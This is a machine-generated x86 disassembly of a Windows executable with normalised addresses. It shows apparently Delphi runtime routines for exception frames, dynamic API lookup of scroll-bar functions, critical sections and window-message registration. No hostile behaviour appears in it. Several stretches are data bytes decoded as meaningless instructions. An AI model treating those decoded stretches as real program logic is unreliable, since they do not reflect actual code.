mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405754
xor eax eax
push ebp
push sub_42605f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4056f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426066
lea eax [ ebx + 0xc ]
call sub_4056e0
sub_42606c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_426101
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4040c8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_425df8
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426108
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
call sub_42590c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42593c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_425adc
sub_42612c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_424674
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_424674
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413cd4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_424674
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413cd4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413cd4
sub_4261b8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_4258cc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_4032a0
mov eax [ esi + 0x14 ]
call sub_4032a0
mov eax [ esi + 0x10 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4056e0
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42620c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426243
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42624a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_426254
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426279
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426280
retn
sub_42628c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4262bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4262c4
retn
mov eax [ rw-data ]
call sub_4032a0
sub_4262d0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_426304
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42632c
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_4265ae
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4265d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4265dc
retn
sub_4265f0
cmp al 0x66
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] al
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffffe8004010 ]
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
mov esp 0xc0004266
inc dx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x60 ] si
inc dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004266 ] ch
add [ eax ] al
add al dh
inc edx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
add al 0x67
inc edx
add [ edi ] dh
inc edx
add [ eax + 0x67 ] al
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
mov eax esi
call sub_403290
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_4266c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_426704
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42675c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_426781
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426788
retn
sub_426794
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42674c
xor eax eax
push ebp
push sub_42694b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426952
mov eax [ rw-data ]
call sub_426754
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_426954
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42674c
xor eax eax
push ebp
push sub_426d07
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d0e
mov eax [ rw-data ]
call sub_426754
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4270b8
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_4270e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427128
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42712f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4032a0
call sub_426794
cmp [ rw-data ] 0x0
jg r-xdata
sub_427150
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427175
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42717c
retn
sub_427188
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4271ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271b4
retn
sub_4271c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4271e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271ec
retn
sub_4271f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42721d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427224
retn
sub_427230
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427255
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42725c
retn
sub_427268
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42728d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427294
retn
sub_4272a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4272c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4272cc
retn
sub_4272d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4272fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427304
retn
sub_427310
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427335
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42733c
retn
sub_42734c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x73
inc edx
add ah dh
jae r-xdata
cmpsb [ esi ] [ edi ]
add [ eax ] bl
add [ eax ] al
mov al 0x26
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ eax + 0x75 ] bl
inc edx
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
cld
je r-xdata
insd
insd
outsd
outsb
add [ eax ] ch
jbe r-xdata
add [ edx ] al
add [ eax ] dl
add [ edx - 0x11001100 ] eax
jmp esp
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ esp + esi * 2 + 0x75dc0042 ] dh
inc edx
add [ eax ] dh
jne r-xdata
add [ eax ] bl
inc ebp
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
dec edi
outsd
outsb
je r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x7394676f
inc edx
add [ edi + 0x60041 ] ch
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] al
adc [ eax ] al
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
add eax 0x336c7443
inc esp
push esp
adc eax [ ecx ]
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ eax + 0x500402a ] ch
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov [ esi + 0x30 ] 0x1
push esi
add esp 0xfffffff0
call sub_4035c4
push sub_427590
call sub_41b174
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
rcl [ ebx ] 0x41
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
pop esi
pop ebx
retn
outsb
push ebx
push 0x5653776f
test dl dl
je r-xdata
rcl [ ebx ] 0x41
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
sub_4274fc
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
call sub_41b20c
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_427530
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45e488
mov cl 0x1
sub_427558
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034f0
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_427590
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4275ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427628
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_454e78
mov [ ebp - 0x14 ] eax
call sub_454d94
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4276eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45dd78
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_4276bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4276c4
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ddd4
retn
sub_4276c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4276f2
mov eax [ ebp - 0x14 ]
call sub_454f2c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_454d9c
retn
sub_4277c8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408d3c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_427863
add [ edi ] cl
add [ eax ] al
add [ eax + 0x24004827 ] dl
xor eax 0x48
add [ eax ] al
mov [ edi ] fs
dec eax
add [ eax + 0x38 ] dh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffb7d9 ] cl
xor al 0x48
add [ eax ] al
add [ eax ] al
add [ edi + 0x39f00048 ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x6bffb7d9 ] al
cmp [ eax ] cl
add [ eax ] al
add [ eax ] al
jl r-xdata
cmp [ eax ] cl
add [ eax ] al
add [ eax ] al
insb
daa
dec eax
dec eax
add [ eax ] cl
cmp [ eax ] cl
add [ eax ] al
add [ eax ] al
js r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427975
retn
cmp [ rw-data ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] ch
dec eax
add [ eax + 0x483a ] dh
add [ eax ] al
add [ edi ] dh
dec eax
add [ ebp + esi + 0x48 ] cl
add [ eax ] al
xor [ edi ] ah
dec eax
add ah dl
cmp [ eax ] ecx
add [ eax ] al
add [ eax ] al
sub al 0x27
dec eax
add [ eax ] ch
cmp cl [ eax ]
add [ eax ] al
add [ eax ] al
sub [ edi ] ah
dec eax
add [ edi + esi + 0x48 ] ah
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42796e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
aaa
dec eax
add [ edi + esi + 0x48 ] al
dec eax
add [ ecx + edi + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ edi + 0x48 ] dh
add [ eax ] bl
aaa
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] dh
dec eax
add [ eax + edi ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ edi + 0x48 ] ch
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404afc
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_427978
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403dc4
call sub_4277c8
mov eax [ r-xdata ]
call sub_413620
mov eax [ r-xdata ]
call sub_4136c0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
sub_4279b8
add al 0x7a
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7a ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 ] dh
inc edx
add [ edx + edi * 2 ] bh
inc edx
add [ eax + eax ] al
add [ eax + 0x54004126 ] dh
test al 0x41
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
adc al 0x84
inc edx
add [ eax ] bl
inc ebp
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add ah al
add [ edx ] 0x1
add bh ch
inc [ ebp + eax * 4 + 0x54060042 ]
push esp
imul ebp [ ebp + 0x65 ] 0x7a489072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x427a0472
add [ edi + 0x50041 ] ch
or [ ebp + 0x78 ] al
je r-xdata
dec ecx
outsb
